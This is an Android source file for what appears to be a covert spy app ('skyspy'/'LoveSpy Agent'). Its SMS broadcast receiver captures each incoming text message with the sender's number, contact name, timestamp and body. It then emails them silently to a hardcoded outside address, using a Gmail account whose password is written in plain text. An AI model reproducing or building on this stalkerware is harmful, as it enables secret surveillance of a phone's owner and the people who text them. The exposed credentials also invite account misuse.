package com.example.skyspy.app.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.telephony.SmsMessage;
import android.util.Log;

import com.example.skyspy.app.email.EmailSending;
import com.example.skyspy.app.utils.Utils;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class SmsReceivedListener extends BroadcastReceiver {

    private Context mContext;
    private Bundle mBundle;

    @Override
    public void onReceive(Context context, Intent intent) {
        mContext = context;
        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
            mBundle = intent.getExtras();
            new AsyncTask<String,Void,Void>() {
                @Override
                protected Void doInBackground(String... params) {
                    String letter = params[0];
                    sendEmailSilently(letter);
                    return null;
                }
            }.execute(getSmsDetails());
        }
    }

    public void sendEmailSilently(String letter) {
        EmailSending emailSending = new EmailSending("o.kapustiyan@gmail.com", "samsungforever");
        String[] toArr = {"1eecooper@ukr.net"};
        emailSending.setTo(toArr);
        emailSending.setFrom("wooo@wooo.com");
        emailSending.setSubject("[Sms] LoveSpy Agent");
        emailSending.setBody(letter);
        try {
            emailSending.sendSilently();
        } catch(Exception e) {
            Log.e(Utils.TAG, "Could not send email", e);
        }
    }

    public String getDate(Long timeMs) {
        Date date = new Date(timeMs);
        DateFormat df = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
        return df.format(date);
    }

    public String getContactName(String address) {
        String name = null;
        Uri peopleUri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(address));
        String[] projection = new String[] { ContactsContract.PhoneLookup.DISPLAY_NAME };
        Cursor cur = mContext.getContentResolver().query(peopleUri, projection, null, null, null);
        if (cur.getCount() > 0) {
            cur.moveToFirst();
            name = cur.getString(cur.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
        }
        cur.close();
        return name;
    }

    public String removeNewLine(String str){
        str = str.replace("\n"," ");
        return str;
    }

    private String getSmsDetails(){
        String message = "";
        SmsMessage[] msgs;
        String address, body;
        Long time;
        if(mBundle != null) {
            try {
                Object[] pdus = (Object[]) mBundle.get("pdus");
                msgs = new SmsMessage[pdus.length];
                for (int i = 0; i < msgs.length; i++) {
                    msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                    address = msgs[i].getOriginatingAddress();
                    body = msgs[i].getMessageBody();
                    time = msgs[i].getTimestampMillis();
                    if (i == 0) {
                        message += "Date: "+getDate(time)+"\n";
                        message += "Type: INBOX\n";
                        message += "Number: "+address+"\n";
                        message += "Name: "+getContactName(address)+"\n";
                        if (msgs.length == 1) {
                            message += "Body: "+removeNewLine(body)+"\n";
                        } else {
                            message += "Body: "+removeNewLine(body)+" ";
                        }
                    } else {
                        message += removeNewLine(body)+" ";
                    }
                }
                if (msgs.length == 1) {
                    message += "_______________"+"\n";
                } else {
                    message += "\n"+"_______________"+"\n";
                }
            } catch (Exception e){
                e.printStackTrace();
            }
        }
        return message;
    }
}
